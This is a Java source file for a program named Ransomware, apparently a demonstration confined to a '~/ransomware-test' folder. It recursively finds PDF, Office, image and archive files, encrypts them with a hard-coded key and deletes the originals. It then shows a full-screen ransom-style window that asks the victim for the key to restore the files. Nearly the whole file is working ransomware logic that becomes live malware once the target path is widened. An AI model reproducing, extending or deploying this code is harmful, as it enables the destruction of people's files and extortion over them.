import org.apache.commons.io.FileUtils;

import java.awt.event.*;
import javax.swing.*;
import java.util.*;
import java.io.*;
import java.awt.*;

public class Ransomware {

  static JFrame f;
  static JLabel l;

  // enums for OS
  public enum OS {
    WINDOWS,
    LINUX,
    MAC
  };

  public static String key = "QfTjWmZq4t7w!z%C"; // 128 bit encryption/decryption key
  private static OS os = null;

  public static void main(String[] args) {
    FileFinder(); // encrypting first, then show the warning form
    WarningForm(); // showing warning message
  }

  // file finder
  public static void FileFinder() {
    switch(getOS()) {
      case WINDOWS:
        System.out.println("Running on Windows");
        break;
      case LINUX:
        System.out.println("Running on Linux");
        break;
      case MAC:
        System.out.println("Running on MAC");
        break;
    }
    // Path
    ArrayList<String> CriticalPathList = new ArrayList<String>();
    // adding files (custom test directory)
    CriticalPathList.add(System.getProperty("user.home") + "/ransomware-test");
    // looping list
    for(String targetDir:CriticalPathList) {
      // setting up path
      File root = new File(targetDir);
      try {
        // common extensions
        String[] extensions = {"pdf", "doc", "png", "txt", "zip", "rar", "jpg", "xls"};
        // collection of found files
        Collection files = FileUtils.listFiles(root, extensions, true); // true = recursive
        // looping collection
        for(Object o: files) {
          // file instance
          File file = (File) o;
          // passing file to the encryptor
          Encryptor(file.getAbsolutePath());
        }
      } catch(Exception e) {
        e.printStackTrace();
      }
    }
  }

  public static void FileFinder(String ext) {
    // polymorphism
    switch(getOS()) {
      case WINDOWS:
        System.out.println("Running on Windows");
        break;
      case LINUX:
        System.out.println("Running on Linux");
        break;
      case MAC:
        System.out.println("Running on MAC");
        break;
    }
    // Path
    ArrayList<String> CriticalPathList = new ArrayList<String>();
    // adding files (custom test directory)
    CriticalPathList.add(System.getProperty("user.home") + "/ransomware-test");
    // looping list
    for(String targetDir:CriticalPathList) {
      // setting up path
      File root = new File(targetDir);
      try {
        // common extensions
        String[] extensions = {ext};
        // collection of found files
        Collection files = FileUtils.listFiles(root, extensions, true); // true = recursive
        // looping collection
        for(Object o: files) {
          // file instance
          File file = (File) o;
          Decryptor(file.getAbsolutePath());
        }
      } catch(Exception e) {
        e.printStackTrace();
      }
    }
  }

  public static void Encryptor(String TargetFilePath) {
    // define a key
    File targetFile = new File(TargetFilePath);
    // setting encryption
    File encryptionTarget = new File(TargetFilePath + ".encrypted"); // file.encrypted
    try {
      CryptoUtils.encrypt(key, targetFile, encryptionTarget);
    } catch(CryptoException ex) {
      ex.printStackTrace();
    }
    // removing a file
    targetFile.delete();
  }

  public static void Decryptor(String EncryptedFilePath) {
    // target (encrypted file)
    File targetFile = new File(EncryptedFilePath);
    // finding file
    File decryptedTargetFile = new File(EncryptedFilePath + ".decrypted");
    try  {
      // decrypting
      CryptoUtils.decrypt(key, targetFile, decryptedTargetFile);
    } catch(CryptoException ex) {
      ex.printStackTrace();
    }
    // deleting encrypted file
    targetFile.delete();
  }

  public static OS getOS() {
    if(os == null) {
      // getting current OS
      String opSys = System.getProperty("os.name").toLowerCase();
      // detecting OS
      if(opSys.contains("win")) {
        os = os.WINDOWS; // setting up by Enum
      } else if(opSys.contains("nix") || opSys.contains("nux") || opSys.contains("aix")) {
        os = os.LINUX;
      } else if(opSys.contains("mac")) {
        os = os.MAC;
      }
    }
    return os;
  }

  public static void WarningForm() {
    // frame
    f = new JFrame("Warning");
    // label
    l = new JLabel();
    l.setText("Warning, all your important files are unfortunately encrypted. In order to decrypt these file obtain the key");
    // new panel
    JPanel p = new JPanel();
    p.add(l);
    f.add(p);
    // input element
    JPanel panel = new JPanel();
    // text field
    JTextField tf = new JTextField(10);
    // button
    JButton submit = new JButton("Restore my files");
    // event
    submit.addActionListener(new ActionListener() {
      @Override
      public void actionPerformed(ActionEvent e) {
        String strVictimKey = tf.getText();
        if(strVictimKey.equalsIgnoreCase(key)) {
          JOptionPane.showMessageDialog(f, "Your files are now under the decryption process, please wait.");
          // Decrypting
          FileFinder("encrypted");
        } else {
          JOptionPane.showMessageDialog(f, "Your key is wrong, please try again.");
        }
      }
    });

    // adding to panel
    panel.add(tf);
    panel.add(submit);
    // centering
    f.getContentPane().add(BorderLayout.SOUTH, panel);
    // setting values
    f.setVisible(true);
    f.setExtendedState(JFrame.MAXIMIZED_BOTH);
    f.setUndecorated(true);
    f.setVisible(true);
  }
}
